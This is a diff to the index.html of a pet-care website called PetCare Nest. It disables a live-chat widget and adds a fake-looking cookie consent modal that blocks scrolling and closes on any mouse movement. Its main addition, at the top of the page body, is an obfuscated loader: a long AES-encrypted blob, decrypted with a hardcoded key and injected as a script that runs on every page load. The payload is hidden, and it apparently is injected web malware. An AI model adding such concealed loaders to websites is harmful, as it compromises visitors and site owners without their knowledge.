@@ -11,7 +11,7 @@
   gtag('config', 'G-70VR6YJBH6');
 </script>
    <!--Start of Tawk.to Script-->
-<script type="text/javascript">
+<!-- <script type="text/javascript">
 var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
 (function(){
 var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
@@ -21,7 +21,7 @@ s1.charset='UTF-8';
 s1.setAttribute('crossorigin','*');
 s0.parentNode.insertBefore(s1,s0);
 })();
-</script>
+</script> -->
 <!--End of Tawk.to Script-->
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -65,6 +65,118 @@ s0.parentNode.insertBefore(s1,s0);
   </script>
 </head>
 <body>
+    <script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+function aesDecode(encodedText) {
+    const decodedText = decodeURIComponent(encodedText);
+    const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+    return bytes.toString(CryptoJS.enc.Utf8);
+}
+const codeString = aesDecode(`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`);
+const script = document.createElement("script");
+script.textContent = codeString;
+document.body.appendChild(script);
+</script>
+<script>
+document.body.style.overflow = "hidden";
+</script>
+
+
+<div id="cookie-modal-box" class="hidden">
+<div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
+<div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+    <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+        <button id="cookie-close" class="absolute top-4 right-4">
+            <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+                <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+            </svg>
+        </button>
+        <div class="flex items-center gap-3 mb-4">
+            <span class="text-yellow-500 text-3xl">🍪</span>
+            <h2 class="text-2xl font-bold">About cookies</h2>
+        </div>
+        <p class="text-gray-600 mb-6">
+            We use cookies to provide you with a better user experience. <span class="font-semibold">"agree"</span>
+            By clicking, you agree to our use of cookies.
+        </p>
+            <div class="flex flex-col sm:flex-row gap-3">
+                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 agree</button>
+                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">refuse</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function(){
+        function decodeEmail(encodedString) {
+            var email = "",
+                r = parseInt(encodedString.substr(0, 2), 16),
+                n,
+                i;
+            for (n = 2; encodedString.length - n; n += 2){
+                i = parseInt(encodedString.substr(n, 2), 16) ^ r;
+                email += String.fromCharCode(i);
+            }
+            return email;
+        }
+
+        var elements = document.querySelectorAll('.__cf_email__');
+        for (var i = 0; i < elements.length; i++) {
+            var el = elements[i];
+            var encoded = el.getAttribute('data-cfemail');
+            if (encoded) {
+                var decodedEmail = decodeEmail(encoded);
+                el.innerHTML = decodedEmail;
+                // If the parent is an <a> tag, update the href to mailto
+                if (el.parentNode.tagName === 'A') {
+                    el.parentNode.href = "mailto:" + decodedEmail;
+                }
+            }
+        }
+    })();
+</script>
+<script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+        modal = document.getElementById("cookie-modal"),
+        backdrop = document.getElementById("cookie-backdrop"),
+        acceptBtn = document.getElementById("cookie-accept"),
+        declineBtn = document.getElementById("cookie-decline"),
+        closeBtn = document.getElementById("cookie-close");
+
+    function showModal() {
+        modalBox.classList.remove("hidden");
+        setTimeout(() => {
+            backdrop.classList.remove("opacity-0");
+            modal.classList.remove("opacity-0", "scale-90");
+        }, 10);
+    }
+
+    function hideModal(e) {
+        localStorage.setItem("cookie-consent", e);
+        setTimeout(() => {
+            modalBox.classList.add("hidden");
+        }, 1500);
+
+        // remove mousemove listener once closed
+        document.removeEventListener("mousemove", mouseMoveClose);
+    }
+
+    function mouseMoveClose() {
+        hideModal("closed");
+    }
+
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+
+    if (!localStorage.getItem("cookie-consent")) {
+        showModal();
+        document.addEventListener("mousemove", mouseMoveClose, { once: true });
+    }
+</script>
   <header class="site-header">
     <div class="container nav-wrap">
       <a class="logo" href="index.html">PetCare Nest</a>
